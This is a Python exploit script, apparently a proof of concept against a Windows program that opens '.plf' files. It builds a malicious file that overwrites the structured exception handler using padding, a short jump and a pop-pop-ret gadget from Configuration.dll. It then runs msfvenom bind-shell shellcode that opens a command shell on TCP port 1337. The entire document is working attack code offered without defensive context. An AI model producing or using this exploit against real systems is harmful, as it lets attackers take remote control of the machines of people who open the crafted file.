#!/usr/bin/env python
import struct

filename="shellcode.plf"

#----------------------------------------------------------------
# badchars = '\x00\x0A\x0D\x1A'   
# nSEH: \xEB\x06\x90\x90: JMP SHORT 0012F254
# SEH:  0x60346758 : pop ebx # pop esi # ret  | Configuration.dll
#----------------------------------------------------------------

# msfvenom -p windows/shell_bind_tcp LPORT=1337 -b '\x00\x0A\x0D\x1A' -f c
shellcode = (
"\xd9\xcf\xba\x4c\x8a\xb1\x1b\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
"\x53\x31\x57\x17\x83\xc7\x04\x03\x1b\x99\x53\xee\x5f\x75\x11"
"\x11\x9f\x86\x76\x9b\x7a\xb7\xb6\xff\x0f\xe8\x06\x8b\x5d\x05"
"\xec\xd9\x75\x9e\x80\xf5\x7a\x17\x2e\x20\xb5\xa8\x03\x10\xd4"
"\x2a\x5e\x45\x36\x12\x91\x98\x37\x53\xcc\x51\x65\x0c\x9a\xc4"
"\x99\x39\xd6\xd4\x12\x71\xf6\x5c\xc7\xc2\xf9\x4d\x56\x58\xa0"
"\x4d\x59\x8d\xd8\xc7\x41\xd2\xe5\x9e\xfa\x20\x91\x20\x2a\x79"
"\x5a\x8e\x13\xb5\xa9\xce\x54\x72\x52\xa5\xac\x80\xef\xbe\x6b"
"\xfa\x2b\x4a\x6f\x5c\xbf\xec\x4b\x5c\x6c\x6a\x18\x52\xd9\xf8"
"\x46\x77\xdc\x2d\xfd\x83\x55\xd0\xd1\x05\x2d\xf7\xf5\x4e\xf5"
"\x96\xac\x2a\x58\xa6\xae\x94\x05\x02\xa5\x39\x51\x3f\xe4\x55"
"\x96\x72\x16\xa6\xb0\x05\x65\x94\x1f\xbe\xe1\x94\xe8\x18\xf6"
"\xdb\xc2\xdd\x68\x22\xed\x1d\xa1\xe1\xb9\x4d\xd9\xc0\xc1\x05"
"\x19\xec\x17\xb3\x11\x4b\xc8\xa6\xdc\x2b\xb8\x66\x4e\xc4\xd2"
"\x68\xb1\xf4\xdc\xa2\xda\x9d\x20\x4d\xe1\x64\xac\xab\x83\x86"
"\xf8\x64\x3b\x65\xdf\xbc\xdc\x96\x35\x95\x4a\xde\x5f\x22\x75"
"\xdf\x75\x04\xe1\x54\x9a\x90\x10\x6b\xb7\xb0\x45\xfc\x4d\x51"
"\x24\x9c\x52\x78\xde\x3d\xc0\xe7\x1e\x4b\xf9\xbf\x49\x1c\xcf"
"\xc9\x1f\xb0\x76\x60\x3d\x49\xee\x4b\x85\x96\xd3\x52\x04\x5a"
"\x6f\x71\x16\xa2\x70\x3d\x42\x7a\x27\xeb\x3c\x3c\x91\x5d\x96"
"\x96\x4e\x34\x7e\x6e\xbd\x87\xf8\x6f\xe8\x71\xe4\xde\x45\xc4"
"\x1b\xee\x01\xc0\x64\x12\xb2\x2f\xbf\x96\xc2\x65\x9d\xbf\x4a"
"\x20\x74\x82\x16\xd3\xa3\xc1\x2e\x50\x41\xba\xd4\x48\x20\xbf"
"\x91\xce\xd9\xcd\x8a\xba\xdd\x62\xaa\xee")

nseh = "\xEB\x06\x90\x90"
seh  = struct.pack("<I", 0x60346758)
nops = "\x90"*20
buffer = "A"*608 + nseh + seh + nops + shellcode + "B"*(1384-len(nops)-len(shellcode))
textfile = open(filename, 'w')
textfile.write(buffer)
textfile.close()